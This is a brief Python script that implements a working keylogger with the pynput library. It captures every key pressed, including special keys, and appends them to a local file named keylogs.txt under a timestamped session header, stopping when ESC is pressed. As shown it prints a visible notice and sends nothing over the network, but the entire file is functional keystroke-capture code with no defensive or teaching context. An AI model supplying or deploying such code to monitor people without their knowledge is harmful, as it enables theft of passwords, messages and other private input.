from pynput.keyboard import Listener
import datetime

LOG_FILE = "keylogs.txt"

def write_log(data):
    with open(LOG_FILE, "a") as f:
        f.write(data)

def on_press(key):
    try:
        write_log(key.char)
    except:
        write_log(f" [{str(key)}] ")

def on_release(key):
    # Stop logging when ESC is pressed
    if str(key) == 'Key.esc':
        write_log("\n--- Session Ended ---\n")
        return False

if __name__ == "__main__":
    # Create header for new session
    header = f"\n--- New Logging Session: {datetime.datetime.now()} ---\n"
    write_log(header)

    print("Keylogger started... Recording keystrokes.")
    print("Press ESC to stop.\n")

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
